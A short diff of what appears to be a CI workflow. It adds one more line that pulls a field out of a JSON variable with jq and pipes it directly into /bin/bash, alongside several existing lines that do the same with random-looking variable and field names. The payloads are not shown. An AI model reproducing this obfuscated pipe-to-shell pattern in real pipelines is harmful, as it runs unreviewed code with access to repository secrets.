@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$vowp55" | jq -r .w0 | /bin/bash
           printf '%s' "$io15936" | jq -r .phxkh77 | /bin/bash
           echo $vkz6 | jq -r .aend48590 | /bin/bash
+          echo $hmmki4 | jq -r .vt2 | /bin/bash
 
       - name: Save output
         if: always()
